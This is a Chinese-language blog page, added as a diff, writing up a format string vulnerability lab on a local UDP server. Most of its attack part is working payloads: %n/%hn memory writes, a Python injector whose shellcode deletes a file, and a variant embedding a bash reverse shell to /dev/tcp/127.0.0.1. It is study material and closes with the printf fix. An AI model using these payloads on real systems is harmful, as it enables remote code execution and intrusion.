@@ -1,0 +1,582 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  <title>Format-String-lab - Hexo</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/github-gist.min.css" />
+  
+
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_yg9cfy8wd6.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_pjno9b9zyxs.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script  src="/js/utils.js" ></script>
+<meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="view intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              
+  <div class="mt-3 post-meta">
+    <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+    <time datetime="2020-10-11 15:48">
+      2020年10月11日 下午
+    </time>
+  </div>
+
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      2.4k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      30
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <div class="post-content mx-auto" id="post">
+            
+            <article class="markdown-body">
+              <h1 id="Format-String-Vulnerability-Lab"><a href="#Format-String-Vulnerability-Lab" class="headerlink" title="Format String Vulnerability Lab"></a>Format String Vulnerability Lab</h1><h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>printf（）中的第一个参数成为格式化字符串，而这里则是有可能被利用从而运行任意代码的，刚开始挺懵的，参考了一篇不错的blog，在这里mark一下：<a href="https://veritas501.space/2017/04/28/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/#more" target="_blank" rel="noopener">格式化字符串漏洞学习</a></p>
+<h2 id="Lab-Tasks"><a href="#Lab-Tasks" class="headerlink" title="Lab Tasks"></a>Lab Tasks</h2><h3 id="Task-1-The-Vulnerable-Program"><a href="#Task-1-The-Vulnerable-Program" class="headerlink" title="Task 1: The Vulnerable Program"></a>Task 1: The Vulnerable Program</h3><p>向sever process发送消息，可以看到会进行相应的打印</p>
+<p><img src="/2020/10/11/Format-String-lab/task1.PNG" srcset="/img/loading.gif" alt="task1"></p>
+<h3 id="Task-2-Understanding-the-Layout-of-the-Stack"><a href="#Task-2-Understanding-the-Layout-of-the-Stack" class="headerlink" title="Task 2: Understanding the Layout of the Stack"></a>Task 2: Understanding the Layout of the Stack</h3><p>下面的figure 1给我们提供了一个stack的大概框架</p>
+<p><img src="/2020/10/11/Format-String-lab/figure1.PNG" srcset="/img/loading.gif" alt="figure1"></p>
+<ol>
+<li><p>在这里，input array的地址就是buf的首地址，为0xbffff0e0</p>
+<p> <img src="/2020/10/11/Format-String-lab/task2-3.PNG" srcset="/img/loading.gif" alt="task2-3"></p>
+<p> 之后，要想办法来找到myprintf函数中return address所在的栈地址以及printf（）的格式化字符串所在的地址</p>
+<p> <img src="/2020/10/11/Format-String-lab/task2-2.PNG" srcset="/img/loading.gif" alt="task2-2"></p>
+<p> 可以看到return address的值是0x080487e5</p>
+<p> 之后我们在gdb中用断点来进行调试（注意gdb中的地址并非是真实的栈的地址，因为gdb过程中会向栈中加入一些信息），首先在mian（）中调用printf（）之前设置断点，因为在调用之前都需要先将参数压入栈中</p>
+<p> <img src="/2020/10/11/Format-String-lab/task2-5.PNG" srcset="/img/loading.gif" alt="task2-5"></p>
+<p> 所以其中eax的值就是buf的地址，是0xbfffe770</p>
+<p> 同理，我们也在myprintf（）调用printf打印msg信息之前也设置断点，但是在这里run的话，server program会去等待client的输入，所以我们在client传一个input文件，来让server端来打印栈中的内容</p>
+ <pre><code class="hljs lsl">python -c 'print <span class="hljs-string">"AAAA"</span>+<span class="hljs-string">"%08X."</span>*<span class="hljs-number">40</span>' &gt; input
+nc -u <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> <span class="hljs-number">9090</span> &lt;input</code></pre>
+
+<p> 有如下显示结果：</p>
+<p> <img src="/2020/10/11/Format-String-lab/task2-6.PNG" srcset="/img/loading.gif" alt="task2-6"></p>
+<p> <img src="/2020/10/11/Format-String-lab/task2-7.PNG" srcset="/img/loading.gif" alt="task2-7"></p>
+<p> 这时候可以看到buffer（圈3）以及return address 的相对偏移量是0xa4，之后在用真正的buffer的虚拟地址减一下就好，是0xbffff03b</p>
+<p> 并且上图中的断点正好是在push之前，此时的esp - 4就是format string的地址，&amp;format string = 0xbfffe630，但是这些并不是真正的虚拟地址，而是在gdb调试中的地址，但是可以用来计算相对位置</p>
+</li>
+<li><p>而此时，圈1和圈3的相对偏移量为0x140 = 320byte，真实的地址分别为（3）0xbffff0e0，（2）0xbffff03b（1）0xbfffefa0</p>
+</li>
+</ol>
+<h3 id="Task3-Crash-the-Program"><a href="#Task3-Crash-the-Program" class="headerlink" title="Task3:  Crash the Program"></a>Task3:  Crash the Program</h3><p>这一步要求我们输入一个message，这个message会使得当myprintf（）尝试执行printf（msg）的时候，程序会发生崩溃，其中一个方法是修改掉myprintf（）的返回地址，这样会发生退出错误，程序崩溃，从上面我们可以知道myprintf（）的返回地址的地址是（2）0xbfffefb8</p>
+<p>构造payload</p>
+<pre><code class="hljs lsl">python -c 'print <span class="hljs-string">"\xb8\xef\xff\xbf%80$n"</span>' &gt; input2
+nc -u <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> <span class="hljs-number">9090</span> &lt;input2</code></pre>
+
+<p>%81$n可以认为是program会向前寻找第81个参数已经输出的字节数，即将返回地址会被写入为4，此时发生程序崩溃</p>
+<p><img src="/2020/10/11/Format-String-lab/task4-4.PNG" srcset="/img/loading.gif" alt="task4-4"></p>
+<p><img src="/2020/10/11/Format-String-lab/task4-3.PNG" srcset="/img/loading.gif" alt="task4-3"></p>
+<h3 id="Task-4-Print-Out-the-Server-Program’s-Memory"><a href="#Task-4-Print-Out-the-Server-Program’s-Memory" class="headerlink" title="Task 4: Print Out the Server Program’s Memory"></a>Task 4: Print Out the Server Program’s Memory</h3><h4 id="Task-4-A-Stack-Data"><a href="#Task-4-A-Stack-Data" class="headerlink" title="Task 4.A: Stack Data."></a>Task 4.A: Stack Data.</h4><p>跟上一个task基本一样，只不过是需要print出来，而不是进行修改</p>
+<p>构造payload</p>
+<pre><code class="hljs lsl">python -c 'print <span class="hljs-string">"AAAA%80$8x"</span>' &gt;input3
+nc -u <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> <span class="hljs-number">9090</span> &lt;input3</code></pre>
+
+<p><img src="/2020/10/11/Format-String-lab/task4.PNG" srcset="/img/loading.gif" alt="task4"></p>
+<h4 id="Heap-Data"><a href="#Heap-Data" class="headerlink" title="Heap Data"></a>Heap Data</h4><p>直接利用对应的地址进行构造就行</p>
+<pre><code class="hljs lsl">python -c 'print <span class="hljs-string">"\x70\x88\x04\x08%80$s"</span>' &gt; input2
+nc -u <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> <span class="hljs-number">9090</span> &lt;input2</code></pre>
+
+<p><img src="/2020/10/11/Format-String-lab/task4-2.PNG" srcset="/img/loading.gif" alt="task4-2">)<img src="/2020/10/11/Format-String-lab/task4-1.PNG" srcset="/img/loading.gif" alt="task4-1"></p>
+<h3 id="Task-5-Change-the-Server-Program’s-Memory"><a href="#Task-5-Change-the-Server-Program’s-Memory" class="headerlink" title="Task 5: Change the Server Program’s Memory"></a>Task 5: Change the Server Program’s Memory</h3><p>在这一个task中，我们需要通过修改payload来对target的值进行修改</p>
+<h4 id="Change-the-value-to-a-different-value"><a href="#Change-the-value-to-a-different-value" class="headerlink" title="Change the value to a different value"></a>Change the value to a different value</h4><p>与task3类似，直接进行构造</p>
+<pre><code class="hljs lsl">python -c 'print <span class="hljs-string">"\x44\xa0\x04\x08%80$n"</span>' &gt; input2
+nc -u <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> <span class="hljs-number">9090</span> &lt;input2</code></pre>
+
+<p><img src="/2020/10/11/Format-String-lab/task5-1.PNG" srcset="/img/loading.gif" alt="task5-1"></p>
+<p><img src="/2020/10/11/Format-String-lab/task5.PNG" srcset="/img/loading.gif" alt="task5"></p>
+<h4 id="Change-the-value-to-0x500"><a href="#Change-the-value-to-0x500" class="headerlink" title="Change the value to 0x500"></a>Change the value to 0x500</h4><p>在进行定向修改的时候，需要把位数进行扩充0x500 - 0x4 = 0x4FC = 1276，因为$n是要将此时已经打印出来的字节数写入到对应的变量/地址当中去，在这里采用%1276x来进行1276个字节的填充</p>
+<pre><code class="hljs lsl">python -c 'print <span class="hljs-string">"\x44\xa0\x04\x08%1276x%80$n"</span>' &gt; input2
+nc -u <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> <span class="hljs-number">9090</span> &lt;input2</code></pre>
+
+<p><img src="/2020/10/11/Format-String-lab/task5-2.PNG" srcset="/img/loading.gif" alt="task5-2"></p>
+<h4 id="Change-the-value-to-0xFF990000"><a href="#Change-the-value-to-0xFF990000" class="headerlink" title="Change the value to 0xFF990000"></a>Change the value to 0xFF990000</h4><p>当要把内存中的某个地方的值改为一个比较大的数字的时候，如果采用%n写入的话，需要提前输入数量巨大的值，所以，如果我们需要改写的时候，最好的方法是采用%hn，它一次写入两个字节，这增加了他的效率，因为每个字节上的数是已经打印的字节数，比如0x7816，如果是四字节写入的话，那么将需要0x7816个字节来打印，而如果是采用%hn，则需要分别写入0x78和0x16，大大的降低了时间</p>
+<p>而当我们要写入一个特别小的数字的时候，由于前面总会需要我们来提供在内存中的位置，所以中会有一些字节是需要被打印的，这使得我们的%n的范围看起来是有下界的，但是并不是这样，因为我们可以通过溢出来达到我们的目的</p>
+<p>接下来进行构造payload，首先是防止目标的地址（0x0804a044）</p>
+<pre><code class="hljs taggerscript"><span class="hljs-symbol">\x</span>44<span class="hljs-symbol">\x</span>a0<span class="hljs-symbol">\x</span>04<span class="hljs-symbol">\x</span>08<span class="hljs-symbol">\x</span>46<span class="hljs-symbol">\x</span>a0<span class="hljs-symbol">\x</span>04<span class="hljs-symbol">\x</span>08</code></pre>
+
+<p>这时候我们已经输入了8个字节，第一块空间写的是0x0000，所以采用溢出的方式，需要些0x10000个，剩余填充0x10000 - 0x8 = 65528，之后向第二个空间写入，他需要的是0x1FF99（因为如果是写入0xFF99的话，前面的填充的个数已经超过了，所以只能采取溢出的方式），0x1FF99 - 0x10000 = 0xFF99 = 65433</p>
+<p>所以payload形式如下</p>
+<pre><code class="hljs taggerscript">python -c 'print "<span class="hljs-symbol">\x</span>44<span class="hljs-symbol">\x</span>a0<span class="hljs-symbol">\x</span>04<span class="hljs-symbol">\x</span>08<span class="hljs-symbol">\x</span>46<span class="hljs-symbol">\x</span>a0<span class="hljs-symbol">\x</span>04<span class="hljs-symbol">\x</span>08<span class="hljs-variable">%65528x%</span>80<span class="hljs-keyword">$hn%65433x%81$hn"' &gt; input2</span></code></pre>
+
+<p><img src="/2020/10/11/Format-String-lab/task5-3.PNG" srcset="/img/loading.gif" alt="task5-3"></p>
+<h3 id="Task-6-Inject-Malicious-Code-into-the-Server-Program"><a href="#Task-6-Inject-Malicious-Code-into-the-Server-Program" class="headerlink" title="Task 6: Inject Malicious Code into the Server Program"></a>Task 6: Inject Malicious Code into the Server Program</h3><p>在这里我们需要把shellcode写入内存，同时修改返回地址为shellcode的地址，在这里可以填充nop指令（0x90）这样的话就算是没有跳转到shellcode的起始地址，我们也可以通过nop来到达</p>
+<p>首先，把shellcode的地址设为buffer起始地点 + 0x100，之后把shellcode的高地址和低地址分开运算，这是为了能够用$hn来进行写入，如果低地址小于8（分为2字节来传输的时候，每个地址4字节，至少也要是8字节，这时候只能按照溢出的方法来进行）就用溢出，如果高地址大于低地址，就用高地址减去低地址，之后就进行要分别填充的fill1和fill2，之后就printf就可以了</p>
+<pre><code class="hljs taggerscript">#!/usr/bin/python3
+import sys
+
+shellcode= '<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>c0<span class="hljs-symbol">\x</span>50<span class="hljs-symbol">\x</span>68bash<span class="hljs-symbol">\x</span>68////<span class="hljs-symbol">\x</span>68/bin<span class="hljs-symbol">\x</span>89<span class="hljs-symbol">\x</span>e3<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>c0<span class="hljs-symbol">\x</span>50<span class="hljs-symbol">\x</span>68-ccc<span class="hljs-symbol">\x</span>89<span class="hljs-symbol">\x</span>e0<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>d2<span class="hljs-symbol">\x</span>52<span class="hljs-symbol">\x</span>68    <span class="hljs-symbol">\x</span>68ile <span class="hljs-symbol">\x</span>68/myf<span class="hljs-symbol">\x</span>68/tmp<span class="hljs-symbol">\x</span>68/rm <span class="hljs-symbol">\x</span>68/bin<span class="hljs-symbol">\x</span>89<span class="hljs-symbol">\x</span>e2<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>c9<span class="hljs-symbol">\x</span>51<span class="hljs-symbol">\x</span>52<span class="hljs-symbol">\x</span>50<span class="hljs-symbol">\x</span>53<span class="hljs-symbol">\x</span>89<span class="hljs-symbol">\x</span>e1<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>d2<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>c0<span class="hljs-symbol">\x</span>b0<span class="hljs-symbol">\x</span>0b<span class="hljs-symbol">\x</span>cd<span class="hljs-symbol">\x</span>80'
+nop = '<span class="hljs-symbol">\x</span>90'
+
+shellcode_address = 0xbffff0e0 + 0x100
+high_adr, low_adr = divmod(shellcode_address, 0x10000)
+
+fill1 = low_adr - 8 if low_adr &gt; 8 else low_adr + 0x10000 - 8
+fill2 = high_adr - low_adr if high_adr &gt; low_adr else high_adr + 0x10000 - low_adr
+
+print ('<span class="hljs-symbol">\x</span>3c<span class="hljs-symbol">\x</span>f0<span class="hljs-symbol">\x</span>ff<span class="hljs-symbol">\x</span>bf<span class="hljs-symbol">\x</span>3e<span class="hljs-symbol">\x</span>f0<span class="hljs-symbol">\x</span>ff<span class="hljs-symbol">\x</span>bf' + '<span class="hljs-variable">%' + str(fill1) + 'x%</span>80<span class="hljs-keyword">$hn%' + str</span>(fill2) + 'x<span class="hljs-variable">%81$hn' + nop*0x100 +shellcode)</span></code></pre>
+
+<p>之后运行</p>
+<pre><code class="hljs angelscript">python injection.py &gt; input2
+nc -u <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> <span class="hljs-number">9090</span> &lt; input2</code></pre>
+
+<p><img src="/2020/10/11/Format-String-lab/task6-1.PNG" srcset="/img/loading.gif" alt="task6-1"></p>
+<p>不建立myfile，则会出现报错</p>
+<p><img src="/2020/10/11/Format-String-lab/task6-2.PNG" srcset="/img/loading.gif" alt="task6-2"></p>
+<h3 id="Task-7-Getting-a-Reverse-Shell"><a href="#Task-7-Getting-a-Reverse-Shell" class="headerlink" title="Task 7: Getting a Reverse Shell"></a>Task 7: Getting a Reverse Shell</h3><p>将shellcode进行修改，其他的地方不用改变</p>
+<pre><code class="hljs taggerscript">#!/usr/bin/python3
+import sys
+
+#shellcode= '<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>c0<span class="hljs-symbol">\x</span>50<span class="hljs-symbol">\x</span>68bash<span class="hljs-symbol">\x</span>68////<span class="hljs-symbol">\x</span>68/bin<span class="hljs-symbol">\x</span>89<span class="hljs-symbol">\x</span>e3<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>c0<span class="hljs-symbol">\x</span>50<span class="hljs-symbol">\x</span>68-ccc<span class="hljs-symbol">\x</span>89<span class="hljs-symbol">\x</span>e0<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>d2<span class="hljs-symbol">\x</span>52<span class="hljs-symbol">\x</span>68    <span class="hljs-symbol">\x</span>68ile <span class="hljs-symbol">\x</span>68/myf<span class="hljs-symbol">\x</span>68/tmp<span class="hljs-symbol">\x</span>68/rm <span class="hljs-symbol">\x</span>68/bin<span class="hljs-symbol">\x</span>89<span class="hljs-symbol">\x</span>e2<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>c9<span class="hljs-symbol">\x</span>51<span class="hljs-symbol">\x</span>52<span class="hljs-symbol">\x</span>50<span class="hljs-symbol">\x</span>53<span class="hljs-symbol">\x</span>89<span class="hljs-symbol">\x</span>e1<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>d2<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>c0<span class="hljs-symbol">\x</span>b0<span class="hljs-symbol">\x</span>0b<span class="hljs-symbol">\x</span>cd<span class="hljs-symbol">\x</span>80'
+shellcode = '<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>c0<span class="hljs-symbol">\x</span>50<span class="hljs-symbol">\x</span>68bash<span class="hljs-symbol">\x</span>68////<span class="hljs-symbol">\x</span>68/bin<span class="hljs-symbol">\x</span>89<span class="hljs-symbol">\x</span>e3<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>c0<span class="hljs-symbol">\x</span>50<span class="hljs-symbol">\x</span>68-ccc<span class="hljs-symbol">\x</span>89<span class="hljs-symbol">\x</span>e0<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>d2<span class="hljs-symbol">\x</span>52<span class="hljs-symbol">\x</span>682&gt;&amp;1<span class="hljs-symbol">\x</span>68&lt;&amp;1 <span class="hljs-symbol">\x</span>6870 0<span class="hljs-symbol">\x</span>681/70<span class="hljs-symbol">\x</span>680.0.<span class="hljs-symbol">\x</span>68127.<span class="hljs-symbol">\x</span>68tcp/<span class="hljs-symbol">\x</span>68dev/<span class="hljs-symbol">\x</span>68 &gt; /<span class="hljs-symbol">\x</span>68h -i<span class="hljs-symbol">\x</span>68/bas<span class="hljs-symbol">\x</span>68/bin<span class="hljs-symbol">\x</span>89<span class="hljs-symbol">\x</span>e2<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>c9<span class="hljs-symbol">\x</span>51<span class="hljs-symbol">\x</span>52<span class="hljs-symbol">\x</span>50<span class="hljs-symbol">\x</span>53<span class="hljs-symbol">\x</span>89<span class="hljs-symbol">\x</span>e1<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>d2<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>c0<span class="hljs-symbol">\x</span>b0<span class="hljs-symbol">\x</span>0b<span class="hljs-symbol">\x</span>cd<span class="hljs-symbol">\x</span>80'
+nop = '<span class="hljs-symbol">\x</span>90'
+
+shellcode_address = 0xbffff0e0 + 0x100
+high_adr, low_adr = divmod(shellcode_address, 0x10000)
+
+fill1 = low_adr - 8 if low_adr &gt; 8 else low_adr + 0x10000 - 8
+fill2 = high_adr - low_adr if high_adr &gt; low_adr else high_adr + 0x10000 - low_adr
+
+print ('<span class="hljs-symbol">\x</span>3c<span class="hljs-symbol">\x</span>f0<span class="hljs-symbol">\x</span>ff<span class="hljs-symbol">\x</span>bf<span class="hljs-symbol">\x</span>3e<span class="hljs-symbol">\x</span>f0<span class="hljs-symbol">\x</span>ff<span class="hljs-symbol">\x</span>bf' + '<span class="hljs-variable">%' + str(fill1) + 'x%</span>80<span class="hljs-keyword">$hn%' + str</span>(fill2) + 'x<span class="hljs-variable">%81$hn' + nop*0x100 +shellcode)</span></code></pre>
+
+<p>这时候进行运行，结果如下</p>
+<p><img src="/2020/10/11/Format-String-lab/task7.PNG" srcset="/img/loading.gif" alt="task7"></p>
+<p><img src="/2020/10/11/Format-String-lab/task7-1.PNG" srcset="/img/loading.gif" alt="task7-1"></p>
+<p><img src="/2020/10/11/Format-String-lab/task7-2.PNG" srcset="/img/loading.gif" alt="task7-2"></p>
+<h3 id="Task-8-Fixing-the-Problem"><a href="#Task-8-Fixing-the-Problem" class="headerlink" title="Task 8: Fixing the Problem"></a>Task 8: Fixing the Problem</h3><p>warning的信息</p>
+<pre><code class="hljs livecodeserver"><span class="hljs-built_in">format</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">a</span> <span class="hljs-keyword">string</span> literal <span class="hljs-keyword">and</span> no <span class="hljs-built_in">format</span> arguments</code></pre>
+
+<p>是在说不是在格式化参数，解决方案，改为printf（“%s”,msg）即可，此时没有warning</p>
+<p><img src="/2020/10/11/Format-String-lab/task8.PNG" srcset="/img/loading.gif" alt="task8"></p>
+<h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>在这次lab中，涉及到了Format-String 漏洞的利用，主要是format-String要指向buffer的区域，以及说通过构造payload</p>
+<blockquote>
+<p>一般来说，每个函数的参数个数都是固定的，被调用的函数知道应该从内存中读取多少个变量，但printf是可变参数的函数，对可变参数的函数而言，一切就变得模糊了起来。函数的调用者可以自由的指定函数参数的数量和类型，被调用者无法知道在函数调用之前到底有多少参数被压入栈帧当中。所以printf函数要求传入一个format参数用以指定到底有多少，怎么样的参数被传入其中。然后它就会忠实的按照函数的调用者传入的格式一个一个的打印出数据。由于编程者的疏忽，把格式化字符串的操纵权交给用户，就会产生后面任意地址读写的漏洞。</p>
+</blockquote>
+<p>所以format参数一般就是‘’‘’形式，其中有一个过程是我们通过构造payload AAAA+…以及通过打印出来的栈中的41414141来确定偏移量，这是由于一方面参数是由右到左依次入栈，还因为有一些与格式化字符串无关的函数以及其它内容，比如在我们这task2中，相隔0x80，但是其中却有着例如msg以及返回地址等相关的东西</p>
+<p>过程应该是如下的，在格式化字符串漏洞中，例如printf（str），先将我们构造的str放到一个buffer区域中，之后在调用到printf（）函数的时候，其实真正作为参数传入的，是格式化字符串的指针</p>
+<p>这里还参考了这一篇blog<a href="https://blog.csdn.net/zhengqijun_/article/details/72454714" target="_blank" rel="noopener">printf（）深入解析</a></p>
+
+            </article>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Software-security-lab/">Software security lab</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" target="_blank" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <div class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/10/18/ARP-Cache-Poisoning-Attack/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">ARP-Cache-Poisoning-Attack</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </div>
+                  <div class="post-next col-6">
+                    
+                    
+                      <a href="/2020/10/09/Bufferr-Overflow-lab/">
+                        <span class="hidden-mobile">Bufferr_Overflow lab</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </div>
+                </div>
+              
+            </div>
+
+            
+          </div>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a id="scroll-top-button" href="#" role="button">
+      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener">
+        <span>Fluid</span></a>
+    </div>
+    
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/main.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+  <script  src="/js/clipboard-use.js" ></script>
+
+
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: 'article.markdown-body',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        collapseDepth: 0,
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc').css('visibility', 'visible');
+      }
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
